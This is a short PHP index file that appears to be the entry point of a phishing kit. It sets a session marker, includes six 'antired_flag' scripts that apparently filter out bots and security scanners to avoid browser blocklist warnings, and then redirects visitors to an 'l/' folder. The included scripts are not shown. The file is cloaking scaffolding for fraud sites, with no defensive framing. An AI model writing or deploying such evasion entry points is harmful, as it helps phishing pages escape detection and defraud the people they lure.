<?php
$_SESSION["xuysnx_here"] = true;

		include "antired_flag/anti1.php";
		include "antired_flag/anti2.php"; 
		include "antired_flag/anti3.php"; 
		include "antired_flag/anti4.php"; 
		include "antired_flag/anti5.php"; 
		include "antired_flag/anti7.php";
	exit(header("Location: l/"));
?>
